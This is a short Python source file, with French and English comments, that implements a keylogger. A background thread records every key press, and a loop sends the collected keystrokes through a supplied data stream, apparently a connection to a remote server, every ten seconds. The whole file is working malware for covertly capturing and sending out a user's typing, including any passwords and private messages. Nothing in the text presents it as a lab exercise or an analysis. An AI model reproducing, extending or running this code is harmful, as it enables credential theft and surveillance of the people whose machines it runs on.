import keyboard
import threading
import time

key_log = []

def log_keystrokes():
    """
    Listen to pressed keys and append them to a list.
    """
    while True:
        event = keyboard.read_event()
        if event.event_type == "down":  # Capture uniquement la pression sur une touche
            key = event.name
            if key == "space":
                key_log.append(" ")
            elif len(key) == 1:  # Si c'est un caractère imprimable
                key_log.append(key)
            else:  # Pour les touches spéciales
                key_log.append(f" [{key}] ")

def send_keylogs(data_stream):
    """
    Send captured keys to a server.
    """
    if key_log:
        logs = "".join(key_log)
        data_stream.send(str.encode(f"Keylogs:\n{logs}\n"))
        key_log.clear()  # Clear the log after sending
    else:
        data_stream.send(str.encode("No keys pressed.\n"))

def start_keylogger(data_stream):
    """
    Initialize the keylogger in a separate thread.
    """
    # Lancer la capture des frappes dans un thread séparé
    keylogger_thread = threading.Thread(target=log_keystrokes, daemon=True)
    keylogger_thread.start()
    
    # Simulation d'envoi régulier des données
    while True:
        send_keylogs(data_stream)
        time.sleep(10)  # Envoi toutes les 10 secondes
